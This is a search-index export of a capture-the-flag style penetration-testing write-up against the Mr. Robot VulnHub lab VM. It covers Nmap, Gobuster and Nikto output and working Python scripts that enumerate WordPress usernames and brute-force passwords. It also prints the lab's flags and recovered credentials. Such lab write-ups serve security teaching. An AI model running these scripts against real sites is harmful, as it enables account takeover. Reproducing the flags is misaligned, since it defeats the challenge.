{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hacking Mr. Robot","text":""},{"location":"#hacking-mr-robot","title":"Hacking Mr. Robot","text":"<p>By: Ivan Arias \ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb</p>"},{"location":"#ethical-hacking-overview","title":"Ethical Hacking - Overview","text":"<p>Penetration testing is like a thorough security checkup for computer systems. Testers simulate hacker activities to find and fix vulnerabilities before attackers can take advantage of them. This practice is essential for maintaining the integrity and security of digital systems.</p> <p>This project is of utmost importance as it aims to conduct a thorough web penetration test using the Mr. Robot Virtual Machine, which simulates realistic web vulnerabilities in a controlled environment. This setup allows for the exploration and documentation of potential security flaws without impacting real systems.</p> <p>Each step, finding, and the overall result will be meticulously documented. This website will provide a detailed account of the methodology and outcomes of the penetration testing journey, offering insights into the process of security assessments and underscoring the importance of regular security maintenance to prevent cyber attacks. Remember, penetration testing is not just a task, it's a crucial practice for maintaining the integrity and security of digital systems.</p>"},{"location":"#contents","title":"Contents","text":"<ul> <li>Executive Summary</li> <li>Step 1: Set Up Environment</li> <li>Step 2: Network Scanning</li> <li>Step 3: Enumeration</li> <li>Step 4: Vulnerabilities</li> <li>Step 5: Brute-force</li> <li>Step 6: Reverse Shell</li> <li>Recommendations</li> <li>Documenting</li> <li>Presentation</li> <li>Technologies</li> <li>Videos</li> </ul>"},{"location":"1-summary/","title":"Executive Summary","text":""},{"location":"1-summary/#executive-summary","title":"Executive Summary","text":"<p>This report presents a structured methodology for ethical hacking and securing systems, specifically focusing on a vulnerable Vulnhub Virtual Machine called Mr. Robot, which hosts a WordPress site.</p> <p>The process begins by creating a controlled, isolated environment to ensure safe testing without affecting live systems. Network scanning tools like Nmap identify live hosts, open ports, and available services, providing a detailed map of the target network.</p> <p>The next phase involves enumeration, utilizing tools such as Gobuster and Wappalyzer to brute-force directories and identify technologies used by the target WordPress site. This information is crucial for understanding the target's infrastructure. Vulnerabilities are then identified using Nmap scripts and Nikto, which scan for outdated software like old versions of WordPress and potential security issues such as SQL injection or cross-site scripting in web servers.</p> <p>Brute-force attacks use Python scripts and Hydra to guess login credentials and identify weak passwords and access points. Finally, the guide explains how to achieve a reverse shell using a PHP script or Metasploit, enabling control over the target system. </p> <p>In short, the guide underlines the importance of ethical hacking and responsible disclosure. It stresses that penetration testing is vital for improving security and maintaining secure systems when conducted ethically and with responsible disclosure. Responsible disclosure is a guideline and a commitment to the community and protecting the systems we test. This commitment makes the work of a penetration tester genuinely impactful.</p>"},{"location":"1-summary/#findings","title":"Findings","text":"<p>The report revealed several critical vulnerabilities:</p> Finding CVSS Score Severity Finding Name Description Recommendation 4 5 Medium WordPress Themes Multiple themes including outdated versions Update themes and remove unused ones 7 5 Low Directories/Files Various sensitive directories and files exposed Restrict access to sensitive directories and files 3 6 Medium WordPress Plugins Various plugins including outdated versions Regularly update all plugins and monitor for vulnerabilities 2 8 High SSL Info Missing security headers and outdated SSL configurations Update SSL/TLS settings and add security headers 5 8 High Configuration Issues Missing security headers and outdated PHP version Update server configurations and PHP version 1 9 High HTTP (80/tcp) - Apache HTTPD Open ports 80 and 443 running Apache HTTPD, potential entry points Ensure Apache is up-to-date and configure security headers 6 9 Critical Credentials Found Username and password retrieved (elliot/ER28-0652) Change all passwords and review user access controls <ol> <li>Open Ports Running Outdated Apache HTTPD</li> <li> <p>Open ports can serve as entry points for attackers, and outdated Apache HTTPD versions may have known security vulnerabilities. These weaknesses can be exploited to gain unauthorized access or execute arbitrary code, compromising the server's security.</p> </li> <li> <p>Missing Security Headers and Outdated SSL Configurations</p> </li> <li> <p>Security headers protect against attacks, including cross-site scripting (XSS) and clickjacking. Outdated SSL configurations can expose the system to man-in-the-middle attacks and other SSL/TLS vulnerabilities. Ensuring up-to-date SSL settings and security headers protects data integrity and confidentiality.</p> </li> <li> <p>Outdated WordPress Plugins and Themes</p> </li> <li> <p>Outdated plugins and themes are common vectors for exploitation, as they often contain unpatched vulnerabilities. Attackers can exploit these to access the WordPress site, deface it, or steal sensitive information. Regular updates and monitoring are essential to maintain site security.</p> </li> <li> <p>Configuration Issues and Outdated PHP Version</p> </li> <li> <p>Misconfigurations and outdated software versions can introduce security risks. An outdated PHP version might have unpatched vulnerabilities that attackers can exploit. Proper configuration management and regular updates are critical to securing the server environment.</p> </li> <li> <p>Exposed Sensitive Directories and Files</p> </li> <li> <p>Exposing sensitive directories and files can provide attackers valuable information about the system, such as configuration details or user credentials. Restricting access to these directories and files is necessary to prevent unauthorized access and information disclosure.</p> </li> <li> <p>Retrieved Credentials</p> </li> <li>The retrieval of credentials (e.g., username and password) indicates weak password policies and potential vulnerabilities in the authentication mechanism. Compromised credentials can allow attackers to gain unauthorized access, emphasizing the need for strong, unique passwords and robust access controls.</li> </ol>"},{"location":"1-summary/#hidden-keys","title":"Hidden keys:","text":"<ul> <li> <p>Flag 1 of 3: 073403c8a58a1f80d943455fb30724b9 </p> </li> <li> <p>Flag 2 of 3: 822c73956184f694993bede3eb39f959</p> </li> <li> <p>Flag 3 of 3: 04787ddef27c3dee1ee161b21670b4e4</p> </li> </ul> Please enable JavaScript to view the comments powered by Disqus. Home \ud83c\udfe0 Next: Step 1"},{"location":"challenge_1/","title":"Step 1: Set Up Environment","text":""},{"location":"challenge_1/#step-1-set-up-environment","title":"Step 1: Set Up Environment","text":"<ul> <li>Download and Install VirtualBox.</li> </ul> <ul> <li>Download Kali Linux VM</li> </ul> <ul> <li>Download Mr. Robot VM from VulnHub.</li> </ul> <ul> <li>Import Kali and  Mr. Robot VM into VirtualBox</li> <li>Create a VM\u2019s  NAT Network.</li> </ul> <ul> <li>Sep up  the network adapter to \u201cNAT Network\u201d mode in both VM.</li> </ul> <ul> <li>Start Kali and Mr Robot VM using VirtualBox Console.</li> </ul> Please enable JavaScript to view the comments powered by Disqus. Previous: Summary Home \ud83c\udfe0 Next: Step 2"},{"location":"challenge_2/","title":"Step 2: Network Scanning","text":""},{"location":"challenge_2/#step-2-network-scanning","title":"Step 2: Network Scanning","text":"<ul> <li>Run a basic scan to check the Network:</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ ip addr                                                       \n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:39:98:6e brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.223/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0\n       valid_lft 84939sec preferred_lft 84939sec\n    inet6 2600:1700:1580:4b60::26/128 scope global dynamic noprefixroute \n       valid_lft 2142sec preferred_lft 2142sec\n    inet6 2600:1700:1580:4b60:8291:bf25:fefb:aca5/64 scope global temporary dynamic \n       valid_lft 3514sec preferred_lft 3514sec\n    inet6 2600:1700:1580:4b60:a00:27ff:fe39:986e/64 scope global dynamic mngtmpaddr noprefixroute \n       valid_lft 3514sec preferred_lft 3514sec\n    inet6 fe80::a00:27ff:fe39:986e/64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n</code></pre> <p>Based on the output  provided from  <code>ip addr</code> command, we can see that the Kali Linux machine is configured with the IP address <code>192.168.1.223</code> on the <code>eth0</code> interface, and it's within the <code>/24</code> subnet. </p> <ul> <li>Identify which hosts are up in the <code>192.168.1.0/24</code> subnet, you can start with a ping sweep using Nmap. This is a non-intrusive way to discover active hosts.</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ nmap -sn 192.168.1.0/24           \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 05:24 EDT\nNmap scan report for amazon-7543b6401.attlocal.net (192.168.1.67)\nHost is up (0.16s latency).\nNmap scan report for 192.168.1.71\nHost is up (0.011s latency).\nNmap scan report for 192.168.1.75\nHost is up (0.012s latency).\nNmap scan report for amazon-d79ebfdc6.attlocal.net (192.168.1.77)\nHost is up (0.12s latency).\nNmap scan report for RokuExpress.attlocal.net (192.168.1.81)\nHost is up (0.0092s latency).\nNmap scan report for wlan0.attlocal.net (192.168.1.84)\nHost is up (0.0084s latency).\nNmap scan report for wlan0.attlocal.net (192.168.1.85)\nHost is up (0.0075s latency).\nNmap scan report for unknown1009f9067e58.attlocal.net (192.168.1.86)\nHost is up (0.12s latency).\nNmap scan report for 192.168.1.196\nHost is up (0.00090s latency).\nNmap scan report for unknownf2a4540f4500.attlocal.net (192.168.1.197)\nHost is up (0.00086s latency).\nNmap scan report for Redmi-Note-12-Pro-5G.attlocal.net (192.168.1.221)\nHost is up (0.0088s latency).\nNmap scan report for 192.168.1.223\nHost is up (0.00058s latency).\nNmap scan report for 192.168.1.226\nHost is up (0.00067s latency).\nNmap scan report for dsldevice.attlocal.net (192.168.1.254)\nHost is up (0.047s latency).\nNmap done: 256 IP addresses (14 hosts up) scanned in 7.85 seconds\n</code></pre> <p>Now that you have identified the target VM, you can perform more in-depth scan on the IP addresses. The goal here is to discover which services are running on the target VM and to identify any potential vulnerabilities associated with these services. </p> <ul> <li>Next, run service and version detection scans on the specific IP addresses found in your first scan.\u00a0Scan for services beginning at port 1 and ending at port 5000.</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ \nnmap -sV -p1-5000 192.168.1.226\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 05:40 EDT\nNmap scan report for unknownf2a4540f4500.attlocal.net (192.168.1.226)\nHost is up (0.0072s latency).\nNot shown: 4997 filtered tcp ports (no-response)\nPORT    STATE  SERVICE    VERSION\n22/tcp  closed ssh\n80/tcp  open   tcpwrapped\n443/tcp open   tcpwrapped\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.72 seconds\n</code></pre> <p>The Nmap scan results show that most ports are filtered (no-response), and the only open ports are 80 (http) and 443 (https), but they are reported as tcpwrapped, and port 22 (ssh) is closed.</p> <p>'tcpwrapped' generally means that the service running on the port is protected by TCP wrappers and the server is not providing any information about the service. This can be due to security measures that limit the visibility of services to unauthorized scanners.</p> <p>To gather more information, we can try the following:</p> <p>Use the --reason option to understand why ports are reported as they are.</p> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sV -p1-5000 --reason 192.168.1.226\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 05:59 EDT\nNmap scan report for unknownf2a4540f4500.attlocal.net (192.168.1.226)\nHost is up, received arp-response (0.00078s latency).\nNot shown: 4997 filtered tcp ports (no-response)\nPORT    STATE  SERVICE  REASON         VERSION\n22/tcp  closed ssh      reset ttl 64\n80/tcp  open   http     syn-ack ttl 64 Apache httpd\n443/tcp open   ssl/http syn-ack ttl 64 Apache httpd\nMAC Address: 08:00:27:52:3B:4C (Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.92 seconds\n</code></pre> <p>The updated Nmap scan results indicate that ports 80 and 443 are open and running Apache HTTPD, while port 22 (SSH) is closed. This suggests that the web server on the target machine might be a potential entry point for further investigation.</p> Please enable JavaScript to view the comments powered by Disqus. Previous: Step 1 Home \ud83c\udfe0 Next: Step 3"},{"location":"challenge_3/","title":"Step 3: Enumeration","text":""},{"location":"challenge_3/#step-3-enumeration","title":"Step 3: Enumeration","text":""},{"location":"challenge_3/#gobuster","title":"Gobuster","text":"<ul> <li>Use  gobuster to find hidden directories and files.</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://192.168.1.226 -w /usr/share/wordlists/dirb/common.txt\n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.226\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 213]\n/.htaccess            (Status: 403) [Size: 218]\n/.htpasswd            (Status: 403) [Size: 218]\n/0                    (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/0/]\n/admin                (Status: 301) [Size: 235] [--&gt; http://192.168.1.226/admin/]\n/atom                 (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/feed/atom/]\n/audio                (Status: 301) [Size: 235] [--&gt; http://192.168.1.226/audio/]\n/blog                 (Status: 301) [Size: 234] [--&gt; http://192.168.1.226/blog/]\n/css                  (Status: 301) [Size: 233] [--&gt; http://192.168.1.226/css/]\n/dashboard            (Status: 302) [Size: 0] [--&gt; http://192.168.1.226/wp-admin/]\n/favicon.ico          (Status: 200) [Size: 0]\n/feed                 (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/feed/]\n/image                (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/image/]\n/images               (Status: 301) [Size: 236] [--&gt; http://192.168.1.226/images/]\n/Image                (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/Image/]\n/index.html           (Status: 200) [Size: 1188]\n/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/]\n/intro                (Status: 200) [Size: 516314]\n/js                   (Status: 301) [Size: 232] [--&gt; http://192.168.1.226/js/]\n/license              (Status: 200) [Size: 19930]\n/login                (Status: 302) [Size: 0] [--&gt; http://192.168.1.226/wp-login.php]\n/page1                (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/]\n/phpmyadmin           (Status: 403) [Size: 94]\n/readme               (Status: 200) [Size: 7334]\n/rdf                  (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/feed/rdf/]\n/robots               (Status: 200) [Size: 41]\n/robots.txt           (Status: 200) [Size: 41]\n/rss                  (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/feed/]\n/rss2                 (Status: 301) [Size: 0] [--&gt; http://192.168.1.226/feed/]\n/sitemap              (Status: 200) [Size: 0]\n/sitemap.xml          (Status: 200) [Size: 0]\n/video                (Status: 301) [Size: 235] [--&gt; http://192.168.1.226/video/]\n/wp-admin             (Status: 301) [Size: 238] [--&gt; http://192.168.1.226/wp-admin/]\n/wp-content           (Status: 301) [Size: 240] [--&gt; http://192.168.1.226/wp-content/]\n/wp-config            (Status: 200) [Size: 0]\n/wp-includes          (Status: 301) [Size: 241] [--&gt; http://192.168.1.226/wp-includes/]\n/wp-cron              (Status: 200) [Size: 0]\n/wp-load              (Status: 200) [Size: 0]\n/wp-links-opml        (Status: 200) [Size: 228]\n/wp-mail              (Status: 403) [Size: 3018]\n/wp-settings          (Status: 500) [Size: 0]\n/wp-signup            (Status: 302) [Size: 0] [--&gt; http://192.168.1.226/wp-login.php?action=register]\n/wp-login             (Status: 200) [Size: 2689]\n/xmlrpc               (Status: 405) [Size: 42]\n/xmlrpc.php           (Status: 405) [Size: 42]\nProgress: 4614 / 4615 (99.98%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p>The gobuster scan revealed several interesting directories and files on the target web server. </p>"},{"location":"challenge_3/#findings","title":"Findings","text":"<ul> <li>/admin (Status: 301) -&gt; Redirects to /admin/</li> <li>/dashboard (Status: 302) -&gt; Redirects to /wp-admin/</li> <li>/login (Status: 302) -&gt; Redirects to /wp-login.php</li> <li>/robots.txt (Status: 200) -&gt; Contains entries which should be hidden</li> <li>/wp-admin (Status: 301) -&gt; Redirects to /wp-admin/</li> <li>/wp-content (Status: 301) -&gt; Redirects to /wp-content/</li> <li>/wp-config (Status: 200) -&gt; Empty, but interesting as it is usually sensitive</li> <li>/wp-login.php (Status: 200) -&gt; WordPress login page</li> </ul> <p>Based on the output  provided from  <code>gobuster</code> command, we can see that the Target VM contains a Wordpress Site.</p> <ul> <li>Examine /robots.txt File:</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ curl http://192.168.1.226/robots.txt\n\nUser-agent: *\nfsocity.dic\nkey-1-of-3.txt\n</code></pre> <ul> <li>Download and Inspect fsocity.dic</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ curl -O http://192.168.1.226/fsocity.dic\n\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 7075k  100 7075k    0     0  8409k      0 --:--:-- --:--:-- --:--:-- 8413k\n                                                                                                                                                  \u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ wc -l fsocity.dic\n858160 fsocity.dic\n\n\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ head fsocity.dic                        \ntrue\nfalse\nwikia\nfrom\nthe\nnow\nWikia\nextensions\nscss\nwindow\n</code></pre> <p>Since the fsocity.dic file is too long, it\u2019s practical to preprocess it before using it in brute-force attacks</p> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ sort fsocity.dic | uniq &gt; fsocity_sorted_unique.dic\n\n\n\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ wc -l fsocity_sorted_unique.dic\n\n11451 fsocity_sorted_unique.dic\n</code></pre> <ul> <li>Download and Inspect key-1-of-3.txt</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ curl -O http://192.168.1.226/key-1-of-3.txt\n\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    33  100    33    0     0   5897      0 --:--:-- --:--:-- --:--:--  6600\n\n\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ cat key-1-of-3.txt\n\n073403c8a58a1f80d943455fb30724b9 # Flag 1 of 3 \u2714\ufe0f\n</code></pre> <p>Flag 1 was found.</p>"},{"location":"challenge_3/#testing-directories","title":"Testing directories","text":"<ul> <li>http://192.168.1.226:80 \ud83d\udcfa Use full screen for a better experience! \ud83d\udcfa</li> </ul>    Your browser does not support the video tag.  <ul> <li> <p>Access /admin, /wp-admin, and /login Directories</p> <ul> <li>http://192.168.1.226/admin/ &amp;  http://192.168.1.226/wp-admin/</li> </ul> </li> </ul> <p></p> <ul> <li>http://192.168.1.226/wp-login.php</li> </ul> <p></p>"},{"location":"challenge_3/#wappalyzer","title":"Wappalyzer","text":""},{"location":"challenge_3/#key-technologies","title":"Key Technologies","text":"<ul> <li>URL: http://192.168.1.226</li> <li>CMS: WordPress</li> <li>Analytics: WordPress</li> <li>Font Scripts: Google Font API</li> <li>Programming Languages: PHP</li> <li>Databases: MySQL</li> </ul>"},{"location":"challenge_3/#analysis","title":"Analysis","text":""},{"location":"challenge_3/#content-management-system-cms","title":"Content Management System (CMS)","text":"<p>WordPress: The site is running on WordPress, which is a popular CMS known for its flexibility and wide range of plugins and themes. However, it also means that the site could be vulnerable to various common WordPress exploits if not properly secured.</p>"},{"location":"challenge_3/#programming-languages","title":"Programming Languages","text":"<p>PHP: The server-side scripting language used by WordPress. PHP vulnerabilities are common in older versions, so ensuring the latest updates and security patches are applied is crucial.</p>"},{"location":"challenge_3/#database","title":"Database","text":"<p>MySQL: The database management system used by WordPress. Securing the database against SQL injection and ensuring proper database configurations and permissions are essential.</p>"},{"location":"challenge_3/#font-scripts","title":"Font Scripts","text":"<p>Google Font API: This is used to load custom fonts from Google Fonts. While generally not a security risk, it's part of the site's overall technology stack.</p> Please enable JavaScript to view the comments powered by Disqus. Previous: Step 2 Home \ud83c\udfe0 Next: Step 4"},{"location":"challenge_4/","title":"Step 4: Vulnerabilities","text":""},{"location":"challenge_4/#step-4-vulnerabilities","title":"Step 4: Vulnerabilities","text":""},{"location":"challenge_4/#nmap","title":"nmap","text":"<ul> <li>Use  nmap to enumerate WordPress-specific information, such as installed plugins, themes, and versions.</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p80,443 --script http-wordpress-enum 192.168.1.226\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 07:07 EDT\nNmap scan report for unknownf2a4540f4500.attlocal.net (192.168.1.226)\nHost is up (0.0022s latency).\n\nPORT    STATE SERVICE\n80/tcp  open  http\n| http-wordpress-enum: \n| Search limited to top 100 themes/plugins\n|   plugins\n|     akismet\n|     contact-form-7 4.1\n|     jetpack 3.3.2\n|     all-in-one-seo-pack \n|     google-sitemap-generator 4.0.7.1\n|     google-analytics-for-wordpress 5.3.2\n|     wptouch 3.7.3\n|     all-in-one-wp-migration 2.0.4\n|     wp-mail-smtp 0.9.5\n|   themes\n|     twentythirteen 1.6\n|     twentyfourteen 1.5\n|_    twentyfifteen 1.3\n443/tcp open  https\n| http-wordpress-enum: \n| Search limited to top 100 themes/plugins\n|   plugins\n|     akismet\n|     contact-form-7 4.1\n|     jetpack 3.3.2\n|     all-in-one-seo-pack \n|     google-sitemap-generator 4.0.7.1\n|     google-analytics-for-wordpress 5.3.2\n|     wptouch 3.7.3\n|     all-in-one-wp-migration 2.0.4\n|     wp-mail-smtp 0.9.5\n|   themes\n|     twentythirteen 1.6\n|     twentyfourteen 1.5\n|_    twentyfifteen 1.3\nMAC Address: 08:00:27:52:3B:4C (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 5.13 seconds\n</code></pre>"},{"location":"challenge_4/#findings","title":"Findings","text":"<p>The <code>http-wordpress-enum</code> script provided information about the WordPress plugins and themes installed on the target site. The results indicate the presence of the following:</p> <p>Plugins:</p> <ul> <li>akismet</li> <li>contact-form-7 (version 4.1)</li> <li>jetpack (version 3.3.2)</li> <li>all-in-one-seo-pack</li> <li>google-sitemap-generator (version 4.0.7.1)</li> <li>google-analytics-for-wordpress (version 5.3.2)</li> <li>wptouch (version 3.7.3)</li> <li>all-in-one-wp-migration (version 2.0.4)</li> <li>wp-mail-smtp (version 0.9.5)</li> </ul> <p>Themes:</p> <ul> <li>twentythirteen (version 1.6)</li> <li>twentyfourteen (version 1.5)</li> <li>twentyfifteen (version 1.3)</li> </ul> <p>This enumeration provides a list of potential attack vectors as these plugins and themes might have known vulnerabilities that could be exploited.</p>"},{"location":"challenge_4/#nikto","title":"nikto","text":"<ul> <li>Use nikto against the identified directories and files to check for known vulnerabilities.</li> </ul> <pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ nikto -h https://192.168.1.226\n\n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          192.168.1.226\n+ Target Hostname:    192.168.1.226\n+ Target Port:        443\n---------------------------------------------------------------------------\n+ SSL Info:        Subject:  /CN=www.example.com\n                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384\n                   Issuer:   /CN=www.example.com\n+ Start Time:         2024-06-25 07:13:05 (GMT-4)\n---------------------------------------------------------------------------\n+ Server: Apache\n+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /UlQw0ECg.conf: Retrieved x-powered-by header: PHP/5.5.29.\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Hostname '192.168.1.226' does not match certificate's names: www.example.com. See: https://cwe.mitre.org/data/definitions/297.html\n+ /: The Content-Encoding header is set to \"deflate\" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/\n+ /admin/: This might be interesting.\n+ /image/: Drupal Link header found with value: &lt;https://192.168.1.226/?p=23&gt;; rel=shortlink. See: https://www.drupal.org/\n+ /wp-links-opml.php: This WordPress script reveals the installed version.\n+ /license.txt: License file found may identify site software.\n+ /admin/index.html: Admin login page/section found.\n+ /wp-login/: Cookie wordpress_test_cookie created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ /wp-login/: Admin login page/section found.\n+ /wordpress/: A Wordpress installation was found.\n+ /wp-admin/wp-login.php: Wordpress login found.\n+ /wordpress/wp-admin/wp-login.php: Wordpress login found.\n+ /blog/wp-login.php: Wordpress login found.\n+ /wp-login.php: Wordpress login found.\n+ /wordpress/wp-login.php: Wordpress login found.\n+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\n+ 8102 requests: 0 error(s) and 22 item(s) reported on remote host\n+ End Time:           2024-06-25 07:17:20 (GMT-4) (255 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n</code></pre>"},{"location":"challenge_4/#findings_1","title":"Findings","text":"<p>Nikto provided additional insights and potential security issues:</p> <p>SSL Info:</p> <ul> <li>Subject: /CN=www.example.com</li> <li>Issuer: /CN=www.example.com</li> <li>Ciphers: ECDHE-RSA-AES256-GCM-SHA384</li> </ul> <p>Server:</p> <ul> <li>Apache web server detected.</li> </ul> <p>Configuration Issues:</p> <ul> <li>Missing Strict-Transport-Security header.</li> <li>Missing X-Content-Type-Options header.</li> <li>Retrieved x-powered-by header: PHP/5.5.29.</li> <li>Apache mod_negotiation enabled with MultiViews.</li> <li>Content-Encoding header set to deflate, potentially vulnerable to BREACH attack.</li> </ul> <p>Interesting Directories/Files:</p> <ul> <li>/admin/</li> <li>/image/</li> <li>/wp-links-opml.php: Reveals the installed WordPress version.</li> <li>/license.txt: May identify site software.</li> <li>/admin/index.html: Admin login page/section found.</li> <li>Multiple WordPress login pages (/wp-login.php, /wp-admin/wp-login.php, etc.)</li> <li>wp-config.php file found, which contains credentials.</li> </ul> Please enable JavaScript to view the comments powered by Disqus. Previous: Step 3 Home \ud83c\udfe0 Next: Step 5"},{"location":"challenge_5/","title":"Step 5: Brute-force","text":""},{"location":"challenge_5/#step-5-brute-force","title":"Step 5: Brute-force","text":""},{"location":"challenge_5/#brute-force-wordpress-login","title":"Brute-force WordPress Login","text":""},{"location":"challenge_5/#option-1-python-scripts","title":"Option 1 Python Scripts","text":"<ul> <li>Test the form manually</li> </ul> <p>Error: Invalid username</p> <ul> <li>Run the script to get the correct username/usernames</li> </ul> <p>The script is designed to identify valid usernames on a WordPress site by attempting to log in with a known invalid password. It uses the requests library to send HTTP POST requests to the WordPress login page and checks the response to determine if the username is valid or not.</p> <pre><code>import requests\n\n# Define the target URL and headers\nurl = \"http://192.168.1.226/wp-login.php\"\n\n# Read the dictionary file\nwith open(\"fsocity_sorted_unique.dic\", \"r\") as file:\n    words = [line.strip() for line in file]\n\n# Function to perform the login attempt\ndef attempt_login(session, username, password):\n    payload = {\n        'log': username,\n        'pwd': password,\n        'wp-submit': 'Log In',\n        'redirect_to': '/wp-admin/',\n        'testcookie': '1'\n    }\n    response = session.post(url, data=payload)\n    return response\n\n# Start a session\nsession = requests.Session()\n\nvalid_usernames = []\n\n# Iterate over each word to check for valid usernames\nfor word in words:\n    try:\n        response = attempt_login(session, word, 'invalidpassword')\n        response_text = response.text\n\n        if \"Invalid username\" in response_text:\n            print(f\"Invalid username: {word}\")\n        elif \"The password you entered for the username\" in response_text:\n            print(f\"Valid username found: {word}\")\n            valid_usernames.append(word)\n        else:\n            print(f\"Unexpected response for username: {word}\")\n            print(response_text[:200])  # Print the first 200 characters of the response for debugging\n    except Exception as e:\n        print(f\"Error processing username: {word}\")\n        print(f\"Exception: {str(e)}\")\n\n# Save valid usernames to a file\nwith open(\"valid_usernames.txt\", \"w\") as file:\n    for username in valid_usernames:\n        file.write(username + \"\\n\")\n\nprint(\"Valid usernames saved to valid_usernames.txt\")\n</code></pre> <p>The script prints a message indicating that the valid usernames have been saved to the file.</p>"},{"location":"challenge_5/#video-usernames","title":"Video usernames","text":"Your browser does not support the video tag.  <ul> <li>Inspecting the valid_usernames.txt</li> </ul> <pre><code>ubuntu@hcoco1:~$ cat valid_usernames.txt\nELLIOT\nElliot\nelliot\n</code></pre> <p>The usernames are: ELLIOT, Elliot, and elliot</p> <ul> <li>Run the script to get the correct password</li> </ul> <p>The script attempts to brute-force the WordPress login by trying each combination of known valid usernames and potential passwords. It uses the requests library to send HTTP POST requests and checks the response to determine if the login attempt was successful or not. If a successful login is found, the script prints the successful username and password combination and stops further attempts for that username</p> <pre><code>import requests  # Import the requests library for making HTTP requests\n\n# Define the target URL for the WordPress login page\nurl = \"http://192.168.1.226/wp-login.php\"\n\n# Define a list of known valid usernames\nvalid_usernames = [\"ELLIOT\", \"Elliot\", \"elliot\"]\n\n# Read the dictionary file containing potential passwords\nwith open(\"fsocity_sorted_unique.dic\", \"r\") as file:\n    passwords = [line.strip() for line in file]  # Strip any leading/trailing whitespace from each line and store in a list\n\n# Function to perform the login attempt\ndef attempt_login(session, username, 